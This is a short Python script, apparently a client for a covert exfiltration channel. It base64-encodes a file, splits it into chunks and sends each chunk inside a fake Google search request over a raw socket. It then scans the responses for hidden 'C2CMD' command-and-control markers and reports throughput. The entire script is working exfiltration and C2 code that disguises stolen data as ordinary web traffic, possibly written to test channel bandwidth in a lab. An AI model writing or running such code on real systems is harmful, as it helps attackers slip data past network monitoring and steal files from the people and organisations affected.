import socket, base64, time, re

GOOGLE_IP = "www.google.com"
GOOGLE_PORT = 80
CHUNK_SIZE = 400  # Safe size per URL segment

def send_file(filepath):
    with open(filepath, "rb") as f:
        data = base64.b64encode(f.read()).decode()

    chunks = [data[i:i+CHUNK_SIZE] for i in range(0, len(data), CHUNK_SIZE)]
    total_chunks = len(chunks)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((GOOGLE_IP, GOOGLE_PORT))
    start_time = time.time()

    for idx, chunk in enumerate(chunks):
        payload = "{}/{}:{}".format(idx, total_chunks, chunk)
        request = (
            "GET /search?q=What+is+{}+ HTTP/1.1\r\n"
            "Host: www.google.com\r\n"
            "Connection: keep-alive\r\n\r\n"
        ).format(payload)
        print("[CLIENT] Sending chunk {}/{}".format(idx+1, total_chunks))
        s.sendall(request.encode())

        response = b""
        while True:
            s.settimeout(0.2)
            try:
                part = s.recv(4096)
                if not part:
                    break
                response += part
            except socket.timeout:
                break

        if b"<!-- C2CMD:" in response:
            match = re.search(rb'<!-- C2CMD:(.*?) -->', response)
            if match:
                print("[CLIENT] Got ACK: {}".format(match.group(1).decode()))

    end_time = time.time()
    elapsed = end_time - start_time
    bits_sent = len(data) * 8
    print("[CLIENT] Sent {} in {:.2f}s ({:.2f} bps)".format(filepath, elapsed, bits_sent/elapsed))
    s.close()

if __name__ == "__main__":
    send_file("file1KB.bin")
